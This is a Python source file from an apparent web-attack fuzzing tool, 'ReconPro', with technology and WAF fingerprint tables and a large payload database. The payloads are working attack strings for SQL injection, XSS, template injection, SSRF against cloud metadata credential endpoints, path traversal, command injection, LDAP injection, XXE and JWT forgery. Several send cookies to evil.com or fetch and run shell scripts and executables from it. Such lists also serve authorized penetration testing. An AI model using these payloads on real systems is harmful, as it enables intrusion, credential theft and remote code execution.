     1→"""
     2→ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
     3→=====================================================
     4→Selects intelligent payloads based on the target's detected technology stack
     5→instead of blindly testing all payloads against every parameter.
     6→
     7→Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
     8→"""
     9→
    10→from __future__ import annotations
    11→
    12→import re
    13→import time
    14→import json
    15→import urllib.parse
    16→import urllib.request
    17→import urllib.error
    18→from dataclasses import dataclass, field
    19→from typing import Optional
    20→
    21→from .profiler import TechProfile
    22→
    23→
    24→# ──────────────────────────────────────────────────────────────────────────────
    25→# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
    26→# ──────────────────────────────────────────────────────────────────────────────
    27→
    28→TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    29→    "headers": {
    73→        "X-Generator": {
    74→            "Drupal": "Drupal",
    75→            "WordPress": "WordPress",
    76→            "Joomla": "Joomla",
    77→            "Ghost": "Ghost",
    78→            "Hugo": "Hugo",
    79→            "Hexo": "Hexo",
    80→        },
    81→        "X-AspNet-Version": {"": "ASP.NET"},
    82→        "X-AspNetMvc-Version": {"": "ASP.NET MVC"},
    83→        "X-Runtime": {"": "Ruby"},
    84→        "X-Served-By": {"": "Fastly"},
    85→        "X-Jenkins": {"": "Jenkins"},
    86→        "X-Cache": {
    87→            "HIT": "Varnish",
    88→            "MISS": "Varnish",
    89→        },
    90→        "X-WordPress": {"": "WordPress"},
    91→    },
    92→    "html_meta": {
    93→        "generator": {
    94→            "WordPress": "WordPress",
    95→            "Joomla": "Joomla",
    96→            "Drupal": "Drupal",
    97→            "Ghost": "Ghost",
    98→            "Typecho": "Typecho",
    99→            "Hexo": "Hexo",
   100→            "Hugo": "Hugo",
   101→            "vBulletin": "vBulletin",
   102→            "phpBB": "phpBB",
   103→            "MediaWiki": "MediaWiki",
   104→        },
   105→        "viewport": {
   106→            "width=device-width": "Responsive Design",
   107→        },
   108→        "csrf-token": {
   109→            "": "CSRF Protection",
   110→        },
   111→    },
   112→    "cookies": {
   113→        "PHPSESSID": "PHP",
   114→        "JSESSIONID": "Java",
   115→        "ASP.NET_SessionId": "ASP.NET",
   116→        "_rails_session": "Rails",
   117→        "_session_id": "Rails",
   118→        "laravel_session": "Laravel",
   119→        "ci_session": "CodeIgniter",
   120→        "rack.session": "Ruby",
   121→        "connect.sid": "Express",
   122→        "jsessionid": "Java",
   123→        "ASPSESSIONID": "ASP.NET",
   124→        "django_session": "Django",
   125→        "csrftoken": "Django",
   126→        "XSRF-TOKEN": "Angular",
   127→        "ngx_session": "nginx",
   128→        "next-auth.session-token": "Next.js",
   129→    },
   130→    "url_patterns": {
   131→        "/wp-admin": "WordPress",
   132→        "/wp-content": "WordPress",
   133→        "/wp-includes": "WordPress",
   134→        "/wp-json": "WordPress",
   135→        "/wp-login": "WordPress",
   136→        "/xmlrpc.php": "WordPress",
   137→        "/administrator": "Joomla",
   138→        "/media/system": "Joomla",
   139→        "/index.php?option=": "Joomla",
   140→        "/user/register": "Drupal",
   141→        "/sites/default": "Drupal",
   142→        "/graphql": "GraphQL",
   143→        "/graphiql": "GraphQL",
   144→        "/api/graphql": "GraphQL",
   145→        "/api/v1/": "REST API",
   146→        "/api/v2/": "REST API",
   147→        "/swagger": "Swagger/OpenAPI",
   148→        "/api-docs": "Swagger/OpenAPI",
   149→        "/actuator": "Spring Boot",
   150→        "/manage.py": "Django",
   151→        "/flask": "Flask",
   152→        "/.env": "Dotenv",
   153→        "/robots.txt": "Standard Site",
   154→    },
   155→    "js_libraries": {
   156→        "react.production.min.js": "React",
   157→        "react.development.js": "React",
   158→        "react-dom": "React",
   159→        "react.min.js": "React",
   160→        "angular.min.js": "Angular",
   161→        "angular.js": "Angular",
   162→        "ng.app": "Angular",
   163→        "vue.min.js": "Vue",
   164→        "vue.js": "Vue",
   165→        "nuxt": "Vue (Nuxt)",
   166→        "vue.runtime": "Vue",
   167→        "jquery.min.js": "jQuery",
   168→        "jquery.js": "jQuery",
   169→        "jquery-": "jQuery",
   170→        "lodash.min.js": "Lodash",
   171→        "bootstrap.min.js": "Bootstrap",
   172→        "svelte": "Svelte",
   173→        "next/dist": "Next.js",
   174→        "_next/static": "Next.js",
   175→        "alpine": "Alpine.js",
   176→        "htmx": "htmx",
   177→        "axios": "Axios",
   178→        "d3.min.js": "D3.js",
   179→        "three": "Three.js",
   180→        "moment.min.js": "Moment.js",
   181→    },
   182→    "file_extensions": {
   183→        ".php": "PHP",
   184→        ".asp": "ASP",
   185→        ".aspx": "ASP.NET",
   186→        ".jsp": "Java",
   187→        ".do": "Java (Struts)",
   188→        ".action": "Java (Struts)",
   189→        ".py": "Python",
   190→        ".rb": "Ruby",
   191→        ".go": "Go",
   192→        ".rs": "Rust",
   193→        ".pl": "Perl",
   194→        ".cgi": "CGI",
   195→        ".cfm": "ColdFusion",
   196→        ".dll": "IIS",
   197→    },
   198→    "waf_signatures": {
   199→        "X-WAF-Event": "WAF",
   200→        "X-Sucuri-ID": "Sucuri WAF",
   201→        "X-CDN": "Imperva Cloud WAF",
   202→        "X-Veracode-HASH": "Veracode WAF",
   203→        "CF-RAY": "Cloudflare WAF",
   204→        "__cfduid": "Cloudflare WAF",
   205→        "X-Akamai-GS": "Akamai WAF",
   206→        "X-DefendID": "DefendID WAF",
   207→        "X-Iinfo": "F5 BIG-IP ASM",
   208→        "X-Applereason": "Apple WAF",
   209→        "NSC": "NetScaler WAF",
   210→        "CitrixNS_ID": "Citrix WAF",
   211→        "X-WAF-Block": "Generic WAF",
   212→        "X-Frame-Options": "Security Headers Present",
   213→    },
   214→}
   215→
   216→
   217→# ──────────────────────────────────────────────────────────────────────────────
   218→# PAYLOAD_DATABASE — Real pentesting payloads organized by category & framework
   219→# ──────────────────────────────────────────────────────────────────────────────
   220→
   221→PAYLOAD_DATABASE: dict[str, dict[str, list[str]]] = {
   222→
   223→    # ── SQL Injection ──────────────────────────────────────────────────────
   224→    "sqli": {
   225→        "mysql": [
   226→            "' OR '1'='1",
   227→            "1' OR '1'='1' -- ",
   228→            "' OR 1=1 -- ",
   229→            "' UNION SELECT NULL, username, password FROM users-- ",
   230→            "' UNION SELECT 1, table_name FROM information_schema.tables-- ",
   231→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
   232→            "' AND BENCHMARK(5000000,SHA1('test'))-- ",
   233→            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- ",
   234→            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- ",
   235→            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
   236→        ],
   237→        "postgres": [
   238→            "' OR '1'='1",
   239→            "1' OR '1'='1'--",
   240→            "' UNION SELECT NULL, table_name FROM information_schema.tables--",
   241→            "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
   242→            "1; SELECT pg_sleep(5)--",
   243→            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
   244→            "'::int; SELECT 1--",
   245→            "' UNION SELECT NULL, current_database()--",
   246→            "' UNION SELECT NULL, version()--",
   247→            "' UNION SELECT NULL, current_user--",
   248→            "' AND 1=CAST((SELECT version()) AS INT)--",
   249→        ],
   250→        "mssql": [
   251→            "' OR '1'='1",
   252→            "1' OR '1'='1'--",
   253→            "' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U'--",
   254→            "' UNION SELECT NULL, name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
   255→            "1; WAITFOR DELAY '0:0:5'--",
   256→            "'; EXEC master..xp_cmdshell('nslookup attacker.com')--",
   257→            "' UNION SELECT NULL, @@version--",
   258→            "' UNION SELECT NULL, DB_NAME()--",
   259→            "' UNION SELECT NULL, SYSTEM_USER--",
   260→            "' AND 1=CONVERT(INT,(SELECT @@version))--",
   261→        ],
   262→        "sqlite": [
   263→            "' OR '1'='1",
   264→            "1' OR '1'='1'--",
   265→            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
   266→            "' UNION SELECT sql FROM sqlite_master--",
   267→            "' UNION SELECT 1, sqlite_version()--",
   268→            "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
   269→            "1' AND load_extension('libc')--",
   270→            "' UNION SELECT NULL, tbl_name FROM sqlite_master WHERE type='table'--",
   271→            "1' UNION SELECT hex(zeroblob(8192))--",
   272→            "' AND (SELECT count(*) FROM sqlite_master WHERE type='table')>0--",
   273→        ],
   274→        "oracle": [
   275→            "' OR '1'='1",
   276→            "' UNION SELECT NULL, table_name FROM all_tables--",
   277→            "' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--",
   278→            "' UNION SELECT NULL, banner FROM v$version--",
   279→            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)='a'--",
   280→            "' UNION SELECT NULL, SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
   281→            "' UNION SELECT NULL, user FROM dual--",
   282→            "' AND (SELECT UTL_INADDR.get_host_address FROM dual) IS NOT NULL--",
   283→            "' UNION SELECT NULL, ORA_DATABASE_NAME FROM dual--",
   284→            "' OR 1=1||CHR(59)--",
   285→        ],
   286→        "generic": [
   287→            "' OR '1'='1",
   288→            "1 OR 1=1",
   289→            "' OR 1=1--",
   290→            "' OR '1'='1'/*",
   291→            "1' OR '1'='1' -- -",
   292→            "' UNION SELECT NULL,NULL,NULL--",
   293→            "' UNION SELECT NULL,username,password FROM users--",
   294→            "1; DROP TABLE users--",
   295→            "' AND 1=1--",
   296→            "' AND 1=2--",
   297→            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
   298→            "' OR ''='",
   299→            "admin'--",
   300→            "1' ORDER BY 1--",
   301→            "1' ORDER BY 9999--",
   302→            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
   303→            "1' GROUP BY 1--",
   304→            "' AND SUBSTRING(username,1,1)='a'--",
   305→            "1' AND 1=1 UNION SELECT NULL, @@version--",
   306→            "'; EXEC xp_cmdshell('whoami')--",
   307→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
   308→        ],
   309→    },
   310→
   311→    # ── Cross-Site Scripting (XSS) ─────────────────────────────────────────
   312→    "xss": {
   313→        "html": [
   314→            "<script>alert('XSS')</script>",
   315→            "<img src=x onerror=alert(1)>",
   316→            "<svg onload=alert(1)>",
   317→            "<body onload=alert(1)>",
   318→            "<iframe src=javascript:alert(1)>",
   319→            "<marquee onstart=alert(1)>",
   320→            "<details open ontoggle=alert(1)>",
   321→            '<a href="javascript:alert(1)">click</a>',
   322→            '<input onfocus=alert(1) autofocus>',
   323→            '<div style="background:url(javascript:alert(1))">',
   324→        ],
   325→        "angular": [
   326→            "{{7*7}}",
   327→            "{{constructor.constructor('return alert()')()}}",
   328→            "{{$eval.constructor('return alert()')()}}",
   329→            "{{x='constructor';y=x;alert(y)}}",
   330→            "{{''.constructor.constructor('alert(1)')()}}",
   331→            "{{toString.constructor('return alert()')()}}",
   332→            "{{$on.constructor('alert(1)')()}}",
   333→            "{{[].constructor.constructor('alert(1)')()}}",
   334→            "{{0.constructor.constructor('alert(1)')()}}",
   335→            "{{a=toString;b=a.constructor;b('alert(1)')()}}",
   336→        ],
   337→        "react": [
   338→            "{{}}",
   339→            '{"__proto__":{"isAdmin":1}}',
   340→            '{"constructor":{"prototype":{"isAdmin":true}}}',
   341→            '<script src="https://evil.com/1.js"></script>',
   342→            'javascript:alert(1)',
   343→            '<img src=x onerror="window.location=\'https://evil.com/?c=\'+document.cookie">',
   344→            '<a href="https://evil.com" target="_blank" rel="opener">click</a>',
   345→            '"><img src=x onerror=alert(document.domain)>',
   346→            "'-alert(1)-'",
   347→            "<script>document.body.innerHTML=''</script>",
   348→        ],
   349→        "vue": [
   350→            "{{7*7}}",
   351→            "{{this.constructor.constructor('return this')().alert(1)}}",
   352→            "{{constructor.constructor('return alert(1)')()}}",
   353→            "${7*7}",
   354→            "{{_c.constructor('alert(1)')()}}",
   355→            "{{[].pop.constructor('alert(1)')()}}",
   356→            "{{'a'.constructor.constructor('alert(1)')()}}",
   357→            "{{$data.constructor.constructor('alert(1)')()}}",
   358→            "{{typeof this}}",
   359→            "{{[this][0].constructor.constructor('alert(1)')()}}",
   360→        ],
   361→        "generic": [
   362→            "<script>alert(String.fromCharCode(88,83,83))</script>",
   363→            "<img src=1 onerror=alert(1)>",
   364→            "<svg/onload=alert(1)>",
   365→            "'';!--\"<xss>=&{()}",
   366→            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
   367→            "<div data-x=\"\"><img src=x onerror=alert(1)//\"></div>",
   368→            "javascript:void(0)//\"",
   369→            "'-alert(1)-'",
   370→            "<img src=x:alert(alt) onerror=eval(src)>",
   371→            "prompt(1)",
   372→        ],
   373→    },
   374→
   375→    # ── Server-Side Template Injection (SSTI) ──────────────────────────────
   376→    "ssti": {
   377→        "jinja2": [
   378→            "{{7*7}}",
   379→            "{{config}}",
   380→            "{{self.__init__.__globals__}}",
   381→            "{{''.__class__.__mro__[1].__subclasses__()}}",
   382→            "{{''.__class__.__mro__[2].__subclasses__()}}",
   383→            "{{cycler.__init__.__globals__.os}}",
   384→            "{{lipsum.__globals__['os'].popen('id').read()}}",
   385→            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
   386→        ],
   387→        "django": [
   388→            "{% debug %}",
   389→            "{{request}}",
   390→            "{% load debug %}",
   391→            "{% debug context %}",
   392→            "{{settings.SECRET_KEY}}",
   393→            "{{settings.DATABASES}}",
   394→            "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
   395→            "{{user}}",
   396→        ],
   397→        "mako": [
   398→            "${7*7}",
   399→            "${self._modules[context]}}",
   400→            "<%import os%>${os.popen('id').read()}",
   401→            "${__import__('os').popen('id').read()}",
   402→            "<%=7*7%>",
   403→            "${self.__init__.__globals__['os'].popen('id').read()}",
   404→            "${request.environ}",
   405→            "${self.template.module.__builtins__.__import__('os').popen('id').read()}",
   406→        ],
   407→        "twig": [
   408→            "{{7*7}}",
   409→            "{{_self}}",
   410→            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
   411→            "{{['id']|filter('system')}}",
   412→            "{{dump(app)}}",
   413→            "{{app.request.server.all|join(',')}}",
   414→            "{%for x in _context%}{{x}}{%endfor%}",
   415→            "{{_context|json_encode}}",
   416→        ],
   417→        "generic": [
   418→            "{{7*7}}",
   419→            "${7*7}",
   420→            "#{7*7}",
   421→            "<%=7*7%>",
   422→            "${{7*7}}",
   423→            "#{% debug %}",
   424→            "${{config}}",
   425→            "{{7*'7'}}",
   426→            "{{'{{'}}",
   427→            "{{config.items()}}",
   428→        ],
   429→    },
   430→
   431→    # ── Server-Side Request Forgery (SSRF) ─────────────────────────────────
   432→    "ssrf": {
   433→        "aws_metadata": [
   434→            "http://169.254.169.254/latest/meta-data/",
   435→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   436→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
   437→            "http://169.254.169.254/latest/user-data/",
   438→            "http://169.254.169.254/latest/meta-data/hostname",
   439→            "http://169.254.169.254/latest/meta-data/local-ipv4",
   440→            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
   441→            "http://169.254.169.254/latest/dynamic/instance-identity/document",
   442→        ],
   443→        "gcp_metadata": [
   444→            "http://metadata.google.internal/computeMetadata/v1/",
   445→            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
   446→            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
   447→            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
   448→            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
   449→            "http://169.254.169.254/computeMetadata/v1/",
   450→            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
   451→            "http://metadata.google.internal/computeMetadata/v1/os-login/users",
   452→        ],
   453→        "azure_metadata": [
   454→            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
   455→            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
   456→            "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01",
   457→            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
   458→            "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
   459→            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
   460→            "http://169.254.169.254/metadata/instance/compute/plan?api-version=2021-02-01",
   461→            "http://169.254.169.254/metadata/instance/identity?api-version=2021-02-01",
   462→        ],
   463→        "generic": [
   464→            "http://127.0.0.1/",
   465→            "http://localhost/",
   466→            "http://[::1]/",
   467→            "http://0.0.0.0/",
   468→            "http://127.0.0.1:80/",
   469→            "http://localhost:8080/",
   470→            "http://2130706433/",
   471→            "http://0x7f000001/",
   472→            "http://127.1/",
   473→            "http://127.0.0.1./",
   474→            "http://0177.0.0.1/",
   475→            "http://10.0.0.1/",
   476→            "http://192.168.1.1/",
   477→            "http://172.16.0.1/",
   478→            "http://169.254.169.254/",
   479→            "http://metadata/",
   480→        ],
   481→    },
   482→
   483→    # ── Path Traversal ─────────────────────────────────────────────────────
   484→    "path_traversal": {
   485→        "unix": [
   486→            "../../../etc/passwd",
   487→            "..%2f..%2f..%2fetc%2fpasswd",
   488→            "....//....//....//etc/passwd",
   489→            "/etc/passwd",
   490→            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   491→            "..../..../..../etc/passwd",
   492→            "/..../..../..../etc/passwd",
   493→            "../../../etc/shadow",
   494→        ],
   495→        "windows": [
   496→            "..\\..\\..\\windows\\system32\\config\\sam",
   497→            "..%5c..%5c..%5cwindows%5cwin.ini",
   498→            "....\\....\\....\\windows\\win.ini",
   499→            "C:\\windows\\system32\\config\\sam",
   500→            "..\\..\\..\\..\\boot.ini",
   501→            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
   502→            "..\\..\\..\\..\\windows\\repair\\sam",
   503→            "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
   504→        ],
   505→        "generic": [
   506→            "../",
   507→            "../../",
   508→            "../../../",
   509→            "..%2f",
   510→            "%2e%2e/",
   511→            "..%00/",
   512→            "..%252f",
   513→            "..%c0%af",
   514→            "..%ef%bc%8f",
   515→            "..\\",
   516→            "..././..././..././",
   517→            "/.",
   518→            "//",
   519→            "..;/",
   520→            "..%0d%0a/",
   521→            "..\\%0d%0a/",
   522→        ],
   523→    },
   524→
   525→    # ── Command Injection ────────────────────────────────────────────────────
   526→    "command_injection": {
   527→        "unix": [
   528→            "; id",
   529→            "| id",
   530→            "$(id)",
   531→            "`id`",
   532→            "&& id",
   533→            "|| id",
   534→            "\nid",
   535→            "|| whoami",
   536→            "; cat /etc/passwd",
   537→            "| cat /etc/passwd",
   538→            "$(cat /etc/passwd)",
   539→            "`cat /etc/passwd`",
   540→            "; ls -la /",
   541→            "| ping -c 4 127.0.0.1",
   542→            "$(sleep 5)",
   543→            "; curl https://evil.com/shell.sh|sh",
   544→        ],
   545→        "windows": [
   546→            "& whoami",
   547→            "| whoami",
   548→            "%0a whoami",
   549→            "^whoami",
   550→            "&& whoami",
   551→            "|| whoami",
   552→            "& dir C:\\",
   553→            "| dir C:\\",
   554→            "%0d%0a dir C:\\",
   555→            "& net user",
   556→            "& ipconfig /all",
   557→            "& tasklist",
   558→            "& systeminfo",
   559→            "& ping -n 4 127.0.0.1",
   560→            "certutil -urlcache -split -f https://evil.com/payload.exe",
   561→        ],
   562→        "generic": [
   563→            ";",
   564→            "|",
   565→            "&",
   566→            "&&",
   567→            "||",
   568→            "$(",
   569→            "`",
   570→            "\n",
   571→            "\r\n",
   572→            "%0a",
   573→            "%0d%0a",
   574→            "|",
   575→            ";",
   576→            "&",
   577→            "$(sleep 5)&",
   578→            "' sleep 5 '",
   579→        ],
   580→    },
   581→
   582→    # ── LDAP Injection ──────────────────────────────────────────────────────
   583→    "ldap_injection": {
   584→        "generic": [
   585→            "*()(&)",
   586→            "*()|(&",
   587→            "*)(uid=*))(|(uid=*",
   588→            "admin*",
   589→            "admin*)((|(uid=*",
   590→            "*)(uid=*))",
   591→            "*()%",
   592→            "*%00",
   593→            "*)(|(objectclass=*))",
   594→            "(|(cn=*)(objectclass=user))",
   595→            "*)(objectClass=user))(",
   596→            "*)(objectClass=*))(",
   597→            "*)(uid=*",
   598→            "*)(&",
   599→            ")(cn=*)(objectClass=user))",
   600→            "*)(cn=*))%00",
   601→        ],
   602→    },
   603→
   604→    # ── XML External Entity (XXE) ────────────────────────────────────────────
   605→    "xxe": {
   606→        "generic": [
   607→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
   608→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
   609→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
   610→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
   611→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
   612→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
   613→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
   614→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>',
   615→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_SMTP%20INJECTION">]><foo>&xxe;</foo>',
   616→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
   617→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
   618→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar://file:///tmp/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
   619→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://etc/passwd">]><foo>&xxe;</foo>',
   620→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><foo>test</foo>',
   621→            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>',
   622→        ],
   623→    },
   624→
   625→    # ── JWT Bypass ─────────────────────────────────────────────────────────
   626→    "jwt_bypass": {
   627→        "generic": [
   628→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   629→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.",
   630→            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsInN1YiI6IjEyMzQ1Njc4OTAifQ.",
   631→            '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
   632→            '{"alg":"HS256","typ":"JWT"}.{"user":"admin"}.invalid_sig',
   633→            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
   634→            "eyJhbGciOiJITUFDU0hBMjU2IiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   635→            "eyJhbGciOiJBbm9ueW1vdXMiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.",
   636→            '{"kid":"../../dev/null","alg":"HS256"}.{"user":"admin"}.',
   637→            '{"kid":"key\";\nRS256;//","alg":"HS256","typ":"JWT"}.{"user":"admin"}.',
   638→            '{"alg":"HS256","kid":"1; SELECT 1--","typ":"JWT"}.{"user":"admin"}.',
   639→            '{"alg":"RS256","jwk":{"kty":"oct","k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},"typ":"JWT"}.{"user":"admin"}.',
   640→            '{"alg":"PS256","jwk":{"kty":"oct","k":"YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY"},"typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   641→            '{"typ":"JWT","alg":"HS256","crit":["exp"],"exp":9223372036854775807}.{"user":"admin"}',
   642→            '{"typ":"JWT","alg":"HS256","x5t":"../../etc/passwd"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   643→            '{"alg":"none","typ":"JWT"}.eyJhZG1pbiI6dHJ1ZX0.',
